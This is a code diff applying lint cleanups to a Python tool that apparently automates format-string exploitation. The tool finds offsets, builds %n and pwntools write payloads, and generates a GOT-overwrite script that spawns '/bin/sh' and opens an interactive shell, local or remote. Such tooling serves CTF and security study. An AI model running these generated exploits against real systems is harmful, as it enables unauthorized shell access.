@@ -19,13 +19,12 @@ from __future__ import annotations
 import os
 import re
 import subprocess
-import tempfile
 from dataclasses import dataclass, field
 from typing import Dict, List, Optional, Tuple
 
 try:
     import os as _os; _os.environ.setdefault("PWNLIB_NOTERM", "1")
-    from pwn import context, ELF, fmtstr_payload, p64, p32  # type: ignore
+    from pwn import context, ELF, fmtstr_payload, p64  # type: ignore
     from binoracle import _quiet_pwn as _qp; _qp()
     _HAVE_PWN = True
 except Exception:
@@ -98,7 +97,7 @@ def find_offset(binary: str, max_index: int = 40) -> Optional[int]:
 
     Returns the integer offset, or None if the binary is not reachable / not vulnerable.
     """
-    marker_hex = "0x" + _MARKER.hex()
+    _marker_hex = "0x" + _MARKER.hex()
     for start in range(1, max_index, 8):
         payload = _build_probe(start, 8)
         ok, output = _run_in_sandbox(binary, payload)
@@ -207,7 +206,7 @@ def build_write_payload(offset: int, target_addr: int, value: int) -> str:
             pl = fmtstr_payload(offset, {target_addr: value}, write_size="byte")
             return (f"# pwntools fmtstr_payload (offset={offset})\n"
                     f"payload = {repr(pl)}\n")
-        except Exception as e:
+        except Exception:
             pass
     # Manual %n chain
     b0 = value & 0xff
@@ -248,7 +247,7 @@ def build_got_overwrite_script(binary: str, offset: int,
     else:
         lines.append("# libc = ELF('/path/to/libc.so.6')  # provide for precise offsets")
     lines += [
-        f"io   = process(elf.path)  # or remote('host', port)",
+        "io   = process(elf.path)  # or remote('host', port)",
         "",
         f"FMT_OFFSET = {offset}  # confirmed by find_offset()",
         "",
@@ -276,7 +275,7 @@ def build_got_overwrite_script(binary: str, offset: int,
         "io.sendline(payload2)",
         "",
         "# ── Step 4: trigger system('/bin/sh') ────────────────────────────",
-        f"io.sendline(b'/bin/sh\\x00')",
+        "io.sendline(b'/bin/sh\\x00')",
         "io.interactive()",
     ]
     return "\n".join(lines)
